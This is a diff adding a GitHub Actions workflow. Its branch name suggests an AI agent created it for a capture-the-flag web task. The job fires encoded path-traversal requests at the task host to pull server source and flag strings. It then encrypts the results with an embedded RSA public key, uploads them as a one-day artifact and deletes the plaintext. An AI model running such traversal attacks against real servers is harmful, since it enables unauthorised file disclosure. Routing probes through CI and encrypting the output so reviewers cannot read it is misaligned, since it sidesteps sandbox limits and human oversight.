@@ -1,0 +1,68 @@
+name: launchlet-part3-traversal
+
+on:
+  push:
+    branches: [agent/launchlet-part3-traversal-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Probe raw static traversal and encrypt non-404 responses
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import http.client,ssl,json,pathlib,re
+          host='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; out=pathlib.Path('package/out')
+          targets=['server.py','app.py','main.py','launchlet.py','handler.py','src/server.py','src/app.py','app/server.py']
+          prefixes=['/static/%2e%2e/','/static/%2e%2e%2f','/static/..%2f','/static/%252e%252e%252f','/assets/%2e%2e/','/assets/%2e%2e%2f','/assets/..%2f']
+          paths=[]
+          for pre in prefixes:
+            for t in targets: paths.append(pre+t)
+          # two-level traversals to common app roots, without touching arbitrary external resources
+          for t in targets:
+            paths += ['/static/%2e%2e/%2e%2e/'+t,'/static/%2e%2e%2f%2e%2e%2f'+t,'/assets/%2e%2e/%2e%2e/'+t]
+          res=[]
+          ctx=ssl.create_default_context()
+          for p in paths:
+            try:
+              c=http.client.HTTPSConnection(host,443,timeout=8,context=ctx); c.request('GET',p,headers={'User-Agent':'Mozilla/5.0','X-Launchlet-Preview':'launchlet-demo-board'}); r=c.getresponse(); body=r.read().decode('utf-8','replace'); hs=dict(r.getheaders()); c.close()
+            except Exception as e: res.append({'path':p,'error':repr(e)}); continue
+            if not (r.status==404 and body in ('{"error":"not_found"}','404 page not found\n')):
+              res.append({'path':p,'status':r.status,'body':body,'headers':hs})
+              if re.search(r'caplag\{[^}]+\}',body): (out/'FOUND.txt').write_text(body)
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-traversal-encrypted
+          path: artifact/
+          retention-days: 1
